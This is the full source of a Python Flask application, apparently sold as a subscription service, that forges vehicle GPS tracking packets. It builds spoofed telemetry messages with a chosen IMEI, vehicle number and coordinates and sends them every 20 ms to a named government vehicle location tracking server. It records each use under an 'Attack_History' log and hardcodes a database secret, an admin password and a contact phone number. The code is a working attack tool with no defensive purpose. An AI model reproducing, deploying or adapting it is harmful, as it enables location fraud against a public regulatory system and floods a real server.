import os, socket, threading, time, requests
from datetime import datetime
from flask import Flask, render_template_string, request, jsonify, session, redirect, url_for

app = Flask(__name__)
app.secret_key = "nitro_v82_admin_system_final"

# --- CONFIGURATION ---
FB_URL = "https://ghop-ghop-gps-injection-default-rtdb.firebaseio.com/"
FB_SECRET = "hpa10b2FOtP4nP5aYjtMWSoq3bdp1n5sbH6lPDjE"
TAG_LIST = ["RA18", "WTEX", "MARK", "ASPL", "LOCT14A", "ACT1", "AIS140", "VLTD", "AMAZON", "BBOX77", "EGAS", "MENT", "MIJO", "ROADRPA"]

# --- ADMIN LOGIN DETAILS ---
ADMIN_UID = "admin"
ADMIN_PASS = "admin6721"

# --- ENGINE STATE ---
status = {"firing": False, "count": 0, "proto": "UDP", "imei": "", "vno": "", "lat": "", "lon": ""}

LOGIN_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>NITRO V82 - LOGIN</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { background: #000; color: #0f0; font-family: monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .login-box { border: 2px solid #0f0; padding: 30px; border-radius: 15px; background: #050505; box-shadow: 0 0 20px #0f0; width: 300px; text-align: center; }
        input { width: 90%; padding: 12px; margin: 10px 0; background: #111; border: 1px solid #0f0; color: #0f0; border-radius: 5px; text-align: center; font-weight: bold; }
        .btn { padding: 12px; width: 100%; background: #0f0; color: #000; border: none; font-weight: bold; cursor: pointer; border-radius: 5px; text-transform: uppercase; margin-bottom: 20px; }
        .msg { color: #f00; font-size: 13px; margin-bottom: 15px; font-weight: bold; }
        .contact-admin { border-top: 1px solid #333; padding-top: 15px; font-size: 12px; color: #888; }
        .contact-admin a { color: #0f0; text-decoration: none; font-weight: bold; }
        .admin-btn { margin-top: 15px; display: inline-block; font-size: 10px; color: #444; text-decoration: none; border: 1px solid #222; padding: 5px 10px; border-radius: 3px; }
        .admin-btn:hover { color: #0f0; border-color: #0f0; }
    </style>
</head>
<body>
    <div class="login-box">
        <h2 style="letter-spacing: 2px;">🫦 GHOP-GHOP GPS</h2>
        {% if error %}<div class="msg">{{error}}</div>{% endif %}
        <form method="post">
            <input type="text" name="userid" placeholder="USER ID" required>
            <input type="password" name="password" placeholder="PASSWORD" required>
            <button class="btn">LOGIN</button>
        </form>
        <div class="contact-admin">
            FOR NEW ID OR HELP<br>
            CONTACT ADMIN: <a href="https://wa.me/917464010787" target="_blank">WHATSAPP</a>
        </div>
        <a href="/admin" class="admin-btn">ADMIN LOGIN</a>
    </div>
</body>
</html>
"""

ADMIN_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>NITRO ADMIN PANEL</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { background: #050505; color: #0f0; font-family: monospace; padding: 15px; }
        .card { border: 1px solid #0f0; padding: 15px; border-radius: 10px; margin-bottom: 20px; background: #000; box-shadow: 0 0 10px #0f0; }
        input, button { padding: 12px; margin: 5px; background: #111; border: 1px solid #0f0; color: #0f0; border-radius: 5px; width: 90%; }
        button { cursor: pointer; background: #0f0; color: #000; font-weight: bold; width: auto; min-width: 150px; }
        .scroll-table { overflow-x: auto; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; font-size: 11px; }
        th, td { border: 1px solid #333; padding: 8px; text-align: left; }
        th { background: #111; }
        .status-active { color: #0f0; }
        .status-blocked { color: #f00; }
        .nav { display: flex; justify-content: space-between; align-items: center; }
    </style>
</head>
<body>
    <div class="nav">
        <h2>🛠️ ADMIN PANEL</h2>
        <form action="/logout" method="post"><button style="background:none; color:red; border:1px solid red; padding:5px 10px; min-width:auto;">LOGOUT</button></form>
    </div>
    <hr color="#0f0">
    
    <div class="card">
        <h3>➕ NEW USER</h3>
        <form method="POST" action="/admin/add">
            <input type="text" name="new_uid" placeholder="Phone Number" required>
            <input type="text" name="new_pw" placeholder="Password" required>
            <input type="date" name="expiry" required>
            <button type="submit">CREATE ID</button>
        </form>
    </div>

    <div class="card">
        <h3>👥 USERS LIST</h3>
        <div class="scroll-table">
            <table>
                <tr>
                    <th>USER ID</th>
                    <th>PASS</th>
                    <th>EXPIRY</th>
                    <th>STATUS</th>
                    <th>ACTION</th>
                </tr>
                {% for uid, data in users.items() %}
                <tr>
                    <td>{{uid}}</td>
                    <td>{{data.password}}</td>
                    <td>{{data.expiry}}</td>
                    <td class="status-{{data.status|lower}}">{{data.status}}</td>
                    <td><a href="/admin/toggle/{{uid}}" style="color:yellow; text-decoration:none;">[BLOCK/UNBLOCK]</a></td>
                </tr>
                {% endfor %}
            </table>
        </div>
    </div>
</body>
</html>
"""

DASH_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>NITRO V82 - DASHBOARD</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <style>
        body { background: #000; color: #0f0; font-family: monospace; padding: 10px; display: flex; flex-wrap: wrap; justify-content: center; gap: 20px; }
        .box { border: 2px solid #0f0; padding: 20px; border-radius: 15px; width: 100%; max-width: 480px; background: #050505; box-shadow: 0 0 20px #0f0; }
        #map { height: 300px; width: 100%; max-width: 480px; border: 2px solid #0f0; border-radius: 15px; }
        .metric { font-size: 50px; color: #fff; margin: 10px 0; font-weight: bold; }
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; text-align: left; }
        input, select { width: 90%; padding: 10px; background: #111; border: 1px solid #0f0; color: #0f0; border-radius: 5px; font-weight: bold; }
        .full { grid-column: span 2; }
        .btn { padding: 15px; font-size: 16px; cursor: pointer; border: none; border-radius: 8px; width: 100%; font-weight: bold; margin-top: 10px; text-transform: uppercase; }
        .start { background: #008000; color: #fff; }
        .stop { background: #800; color: #fff; }
        .gps { background: #004466; color: #fff; border: 1px solid #00ffff; }
        .reset { background: #333; color: #fff; }
        .logout { background: none; color: #f00; border: 1px solid #f00; padding: 5px; font-size: 10px; cursor: pointer; float: left; }
        .preview { background: #111; color: yellow; padding: 12px; font-size: 11px; word-break: break-all; margin-top: 15px; border: 1px dashed #0f0; min-height: 60px; }
        label { font-size: 11px; color: #aaa; margin-left: 5px; }
    </style>
</head>
<body>
    <div class="box">
        <form action="/logout" method="post"><button class="logout">LOGOUT: {{session['user']}}</button></form>
        <div style="clear:both;"></div>
        <h2 style="margin-top:10px;">💋 GHOP-GHOP GPS 💋</h2>
        <div class="metric" id="cnt">0</div>
        <form action="/action" method="post" class="grid">
            <div class="full">
                <label>VEHICLE NO</label>
                <input type="text" name="vno" id="vno" value="{{vno}}" placeholder="BR01..." oninput="this.value = this.value.toUpperCase(); updateUI();" onblur="checkVehicle()">
            </div>
            <div class="full"><label>IMEI</label><input type="text" name="imei" id="imei" value="{{imei}}" placeholder="862..." oninput="updateUI()"></div>
            <div><label>LATITUDE</label><input type="text" name="lat" id="lat" value="{{lat}}" oninput="updateUI()"></div>
            <div><label>LONGITUDE</label><input type="text" name="lon" id="lon" value="{{lon}}" oninput="updateUI()"></div>
            <button type="button" class="btn gps full" onclick="getLocation()">📍 GET CURRENT LOCATION</button>
            <div class="full">
                <label>PROTOCOL</label>
                <select name="proto" id="proto" onchange="updateUI()">
                    <option value="UDP" {% if proto == 'UDP' %}selected{% endif %}>UDP</option>
                    <option value="TCP" {% if proto == 'TCP' %}selected{% endif %}>TCP</option>
                </select>
            </div>
            {% if session['access_level'] == 'pro' %}
            <div class="full" id="pro-box"><label>📋 PACKET PREVIEW</label><div class="preview" id="preview">Ready...</div></div>
            {% endif %}
            <button class="btn start full" name="btn" value="start">🔥 START ENGINE</button>
            <button class="btn stop full" name="btn" value="stop">🛑 STOP ENGINE</button>
            <button class="btn reset full" name="btn" value="reset">🔄 RESET ALL</button>
        </form>
    </div>
    <div id="map"></div>
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <script>
        var map = L.map('map').setView([{{lat or 25.65}}, {{lon or 84.78}}], 15);
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
        var marker = L.marker([{{lat or 25.65}}, {{lon or 84.78}}]).addTo(map);
        const tags = ["RA18", "WTEX", "MARK", "ASPL", "LOCT14A", "ACT1", "AIS140", "VLTD", "AMAZON", "BBOX77", "EGAS", "MENT", "MIJO", "ROADRPA"];
        let currentCnt = 0;
        function updateUI() {
            let v = document.getElementById('vno').value.toUpperCase();
            let i = document.getElementById('imei').value;
            let rawLat = document.getElementById('lat').value;
            let rawLon = document.getElementById('lon').value;
            let la = rawLat ? parseFloat(rawLat).toFixed(7) : "0.0000000";
            let lo = rawLon ? parseFloat(rawLon).toFixed(7) : "0.0000000";
            let d = new Date().toLocaleDateString('en-GB').replace(/\//g, '');
            let h = new Date().toLocaleTimeString('en-GB', {hour12: false}).replace(/:/g, '');
            let t = tags[currentCnt % tags.length];
            let previewBox = document.getElementById('preview');
            if (previewBox) {
                let pkt = `$PVT,${t},${i},${v},1,${d},${h},${la},N,${lo},E,0.0,0.0,11,73,0.8,0.8,airtel,1,1,11.5,4.3,0,C,26,404,73,0a,e3,e3,0a,7,e3,0a,7,c7,0a,10,e3,0a,0,0001,00,000041,DDE3*`;
                previewBox.innerText = pkt;
            }
            if(rawLat && rawLon) {
                let pos = [parseFloat(la), parseFloat(lo)];
                map.setView(pos, 15); marker.setLatLng(pos);
            }
        }
        async function checkVehicle() {
            let vno = document.getElementById('vno').value.toUpperCase();
            if(!vno) return;
            let res = await fetch(`/check_vehicle?vno=${vno}`);
            let data = await res.json();
            if(data.imei) { document.getElementById('imei').value = data.imei; updateUI(); }
        }
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(pos => {
                    document.getElementById('lat').value = pos.coords.latitude.toFixed(7);
                    document.getElementById('lon').value = pos.coords.longitude.toFixed(7);
                    updateUI();
                }, () => alert("Location denied."));
            }
        }
        setInterval(() => {
            fetch('/data').then(r => r.json()).then(d => {
                currentCnt = d.count;
                document.getElementById('cnt').innerText = d.count.toLocaleString();
                if(d.firing) updateUI();
            });
        }, 1000);
        updateUI();
    </script>
</body>
</html>
"""

def get_user_data(uid):
    try:
        r = requests.get(f"{FB_URL}/users/{uid}.json?auth={FB_SECRET}", timeout=5)
        return r.json()
    except: return None

def log_to_firebase():
    try:
        now = datetime.now()
        timestamp = now.strftime('%Y-%m-%d %H:%M:%S')
        date_key = now.strftime('%Y-%m-%d')
        time_key = now.strftime('%H%M%S')
        user_id = session.get('user')
        vno = status["vno"]
        log_data = {"Vehicle_No": vno, "IMEI_No": status["imei"], "User": user_id, "Lat": status["lat"], "Lon": status["lon"], "Last_Sync": timestamp, "Status": "Active" }
        requests.put(f"{FB_URL}/Data_Records/{vno}.json?auth={FB_SECRET}", json=log_data, timeout=5)
        requests.put(f"{FB_URL}/Attack_History/{date_key}/{user_id}/{vno}/{time_key}.json?auth={FB_SECRET}", json=log_data, timeout=5)
    except: pass

def firing_engine():
    target = ("vlts.bihar.gov.in", 9999)
    while status["firing"]:
        try:
            tag = TAG_LIST[status["count"] % len(TAG_LIST)]
            now = datetime.now()
            f_lat = "{:.7f}".format(float(status["lat"])) if status["lat"] else "0.0000000"
            f_lon = "{:.7f}".format(float(status["lon"])) if status["lon"] else "0.0000000"
            pkt = f"$PVT,{tag},{status['imei']},{status['vno']},1,{now.strftime('%d%m%Y')},{now.strftime('%H%M%S')},{f_lat},N,{f_lon},E,0.0,0.0,11,73,0.8,0.8,airtel,1,1,11.5,4.3,0,C,26,404,73,0a,e3,e3,0a,7,e3,0a,7,c7,0a,10,e3,0a,0,0001,00,000041,DDE3*".encode()
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if status["proto"] == "UDP" else socket.SOCK_STREAM)
            if status["proto"] == "TCP":
                sock.settimeout(3); sock.connect(target); sock.send(pkt)
            else: sock.sendto(pkt, target)
            status["count"] += 1
            sock.close()
            time.sleep(0.02)
        except: time.sleep(1)

@app.route('/', methods=['GET', 'POST'])
def login():
    if 'user' in session: return redirect(url_for('dashboard'))
    error = None
    if request.method == 'POST':
        uid = request.form.get('userid', '').strip()
        pw = request.form.get('password', '').strip()
        data = get_user_data(uid)
        if data and str(data.get('password')) == str(pw):
            exp_str = data.get('expiry', '2000-01-01')
            if datetime.now() > datetime.strptime(exp_str, '%Y-%m-%d'): error = f"EXPIRED ON {exp_str}"
            elif data.get('status') != "Active": error = "ACCOUNT BLOCKED!"
            else:
                session['user'] = uid
                session['access_level'] = data.get('access_level', 'basic')
                session['def_lat'] = str(data.get('lat', ''))
                session['def_lon'] = str(data.get('lon', ''))
                status.update({"lat": session['def_lat'], "lon": session['def_lon']})
                return redirect(url_for('dashboard'))
        else: error = "INVALID ID OR PASSWORD"
    return render_template_string(LOGIN_HTML, error=error)

@app.route('/admin', methods=['GET', 'POST'])
def admin_login():
    if session.get('is_admin'):
        r = requests.get(f"{FB_URL}/users.json?auth={FB_SECRET}")
        users_data = r.json() or {}
        return render_template_string(ADMIN_HTML, users=users_data)
    error = None
    if request.method == 'POST':
        if request.form.get('uid') == ADMIN_UID and request.form.get('pw') == ADMIN_PASS:
            session['is_admin'] = True
            return redirect('/admin')
        else: error = "WRONG ADMIN CREDENTIALS!"
    return render_template_string('''
        <body style="background:#000;color:#0f0;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;">
            <div style="border:2px solid #0f0;padding:30px;text-align:center;">
                <h2>🔐 ADMIN ACCESS</h2>
                {% if error %}<p style="color:red;">{{error}}</p>{% endif %}
                <form method="POST">
                    <input type="text" name="uid" placeholder="ADMIN ID" style="padding:10px;margin:10px;background:#000;border:1px solid #0f0;color:#0f0;"><br>
                    <input type="password" name="pw" placeholder="PASSWORD" style="padding:10px;margin:10px;background:#000;border:1px solid #0f0;color:#0f0;"><br>
                    <button style="padding:10px 30px;background:#0f0;border:none;cursor:pointer;">ENTER</button>
                </form>
            </div>
        </body>
    ''', error=error)

@app.route('/admin/add', methods=['POST'])
def add_user():
    if not session.get('is_admin'): return redirect('/admin')
    uid = request.form.get('new_uid')
    pw = request.form.get('new_pw')
    exp = request.form.get('expiry')
    user_payload = {"access_level": "pro", "expiry": exp, "lat": "25.298801", "lon": "84.651033", "password": pw, "status": "Active"}
    requests.put(f"{FB_URL}/users/{uid}.json?auth={FB_SECRET}", json=user_payload)
    return redirect('/admin')

@app.route('/admin/toggle/<uid>')
def toggle_user(uid):
    if not session.get('is_admin'): return redirect('/admin')
    r = requests.get(f"{FB_URL}/users/{uid}.json?auth={FB_SECRET}")
    curr = r.json()
    new_status = "Blocked" if curr.get('status') == "Active" else "Active"
    requests.patch(f"{FB_URL}/users/{uid}.json?auth={FB_SECRET}", json={"status": new_status})
    return redirect('/admin')

@app.route('/dashboard')
def dashboard():
    if 'user' not in session: return redirect(url_for('login'))
    return render_template_string(DASH_HTML, session=session, **status)

@app.route('/check_vehicle')
def check_vehicle():
    vno = request.args.get('vno', '').upper()
    try:
        r = requests.get(f"{FB_URL}/Data_Records/{vno}.json?auth={FB_SECRET}", timeout=5)
        data = r.json()
        if data: return jsonify({"imei": data.get('IMEI_No')})
    except: pass
    return jsonify({"imei": None})

@app.route('/action', methods=['POST'])
def action():
    if 'user' not in session: return redirect(url_for('login'))
    val = request.form.get('btn')
    if val == "reset":
        status.update({"firing": False, "count": 0, "imei": "", "vno": "", "lat": session.get('def_lat', ''), "lon": session.get('def_lon', '') })
    else:
        status.update({"imei": request.form.get('imei', '').strip(), "vno": request.form.get('vno', '').upper().strip(), "lat": request.form.get('lat', '').strip(), "lon": request.form.get('lon', '').strip(), "proto": request.form.get('proto', 'UDP') })
        if val == "start" and not status["firing"]:
            if all([status["imei"], status["vno"], status["lat"]]):
                status["firing"] = True
                log_to_firebase()
                threading.Thread(target=firing_engine, daemon=True).start()
        elif val == "stop": status["firing"] = False
    return redirect(url_for('dashboard'))

@app.route('/logout', methods=['POST', 'GET'])
def logout():
    session.clear()
    return redirect(url_for('login'))

@app.route('/data')
def data(): return jsonify(status)

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
